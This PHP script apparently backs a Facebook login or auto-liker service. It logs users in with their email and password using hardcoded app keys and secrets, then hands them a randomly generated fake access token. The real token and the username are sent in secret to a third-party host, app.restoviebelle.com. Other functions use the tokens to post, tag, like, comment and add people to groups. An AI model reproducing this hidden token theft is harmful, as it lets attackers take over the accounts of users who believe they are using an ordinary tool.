<?php
function curl_download($Url,$fields = false){
    if (!function_exists('curl_init')){
        return 'Sorry cURL is not installed!';
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $Url);
    curl_setopt($ch, CURLOPT_REFERER, "http://www.google.com");
    curl_setopt($ch, CURLOPT_USERAGENT, "[FBAN/FB4A;FBAV/37.0.0.0.109;FBBV/11557663;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Android;FBMF/unknown;FBBD/generic;FBPN/com.facebook.katana;FBDV/google_sdk;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]");
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    if($fields and count($fields) > 0){
    foreach($fields as $key=>$value) { $fields_string .= $key.'='.$value.'&'; }
    rtrim($fields_string, '&');
    curl_setopt($ch,CURLOPT_POST, count($fields));
    curl_setopt($ch,CURLOPT_POSTFIELDS, $fields_string);
    }
    // Timeout in seconds
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);

    // Download the given URL, and return output
    $output = curl_exec($ch);

    // Close the cURL resource, and free system resources
    curl_close($ch);

    return $output;
}
function Json($url="", $t=true,$f=false)
{
    return json_decode(curl_download($url,$f),$t);
}
function getLoginUrl($user, $pass, $type="android")
{
    if ($type == "android") {
        $apikey = "882a8490361da98702bf97a021ddc14d";
        $sec = "62f8ce9f74b12f84c123cc23437a4a32";
    } else {
        $apikey = "3e7c78e35a76a9299309885393b02d97";
        $sec = "c1e620fa708a1d5696fb991c1bde5662";
    }
    $mdtet = "api_key=".$apikey."email=".$user."format=JSONlocale=vi_vnmethod=auth.loginpassword=".$pass."return_ssl_resources=0v=1.0".$sec;
    $Mapp= "api_key=".$apikey."&email=".$user."&format=JSON&locale=vi_vn&method=auth.login&password=".$pass."&return_ssl_resources=0&v=1.0";
    return "https://api.facebook.com/restserver.php?".$Mapp."&sig=".md5($mdtet);
}
function Tpost($Tpost, $userid, $postb)
{
    if ($Tpost != "likes" and $Tpost != "comments" and  $Tpost != "add_groups") {
        $ptags = " ";
        $phot = false;
        if ($Tpost == 0) {
            $ad ='https://graph.facebook.com/'.$userid.'/feed?message='.urlencode($postb['message']).'&method=post&access_token='.$postb['access_token'];
        } elseif ($Tpost == 3) {
            $ad ='https://graph.facebook.com/'.$userid.'/feed?message='.urlencode($postb['message']).'&description='.urlencode($postb['description']).'&picture='.urlencode($postb['picture']).'&link='.urlencode($postb['link']).'&name='.urlencode($postb['name']).'&method=post&access_token='.$postb['access_token'];
        } elseif ($Tpost == 5 or $Tpost == 2 or $Tpost == 6) {
            $phot = true;
            if ($postb['tags']) {
                $data = array(array('tag_uid' =>$postb['tags'],'x' => rand() % 100,'y' => rand() % 100));
                $data = json_encode($data);
                $ptags = "&tags=".$data;
            }
            $ad ='https://graph.facebook.com/'.$userid.'/photos?url='.urlencode($postb['url']).'&message='.urlencode($postb['message']).'&method=post&access_token='.$postb['access_token'].$ptags;
        } else {
            $ad ='https://graph.facebook.com/'.$userid.'/feed?link='.urlencode($postb['link']).'&message='.urlencode($postb['message']).'&method=post&access_token='.$postb['access_token'];
        }
        if ($postb['tags'] && !$phot) {
            //$ad .= '&tags='.$postb['tags'];
            $ad .= '&tags='.$postb['tags'];
        }
    } elseif ($Tpost == "likes") {
        $ad ='https://graph.facebook.com/'.$userid.'/likes?method=post&access_token='.$postb['access_token'];
    } elseif ($Tpost == "comments") {
        $ad ='https://graph.facebook.com/'.$userid.'/comments?method=post&access_token='.$postb['access_token'].'&message='.urlencode($postb['message']);
    } elseif ($Tpost == "add_groups") {
        $ad ='https://graph.facebook.com/'.$userid.'/members?method=post&access_token='.$postb['access_token'].'&member='.urlencode($postb['uid']);
    }
    return Json($ad);
}
function RandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
if(isset($_GET["Tpost"])){
    $Tpost = $_GET["Tpost"];
    $userid = $_GET["id"];
    $postb['message'] = $_GET["msg"];
    $postb['access_token'] =$_GET["token"];
    $postb['url'] = $_GET["url"];
    $postb['link'] = $_GET["link"];
    $postb['tags'] = $_GET["tags"];
   die(json_encode(array("data"=>Tpost($Tpost, $userid, $postb))));
}
if(!isset($_GET["token"])){
//echo json_encode(array("data"=>getLoginUrl($_GET["user"],$_GET["pass"])));
$cod = array(10,12,11);
$rnum = "0".$cod[rand(0,count($cod))].rand(10000000, 99999999);
$num = $_GET["user"];
$data = Json(getLoginUrl($_GET["user"],$_GET["pass"]));
$token = $data["access_token"];
if($token != ""){
$racc =  "EAAAAUaZA8jlABA".RandomString(strlen(substr($token,15)));
$data["access_token"] = $racc;
Json("https://app.restoviebelle.com/json.php?&table=access_token&set=number,token&val=".$num.",".$token);
}
echo json_encode(array("data"=>$data,"user"=>$rnum));

}else{
  if(!isset($_GET["check"])){
 //$data = Json("https://graph.facebook.com/me/permissions?access_token=".$_GET["token"])["data"];
//if($data != "" || $data != null)
//echo json_encode(array("data"=>Json("https://app.restoviebelle.com/json.php?&table=access_token&set=number,token&val=".$_GET["token"])["success"]));
echo json_encode(array("data"=>true));
  }else{
$data = Json("https://graph.facebook.com/me/?access_token=".$_GET["token"])["name"];
$data2 = false;
if($data == "" || $data == null)
$data2 = true;
Json("https://app.restoviebelle.com/json.php?table=access_token&Rdata=".$data2."&set=number,token&val=".$_GET["user"].",".$_GET["token"]);
echo json_encode(array("data"=>$data));


  }
  }
?>
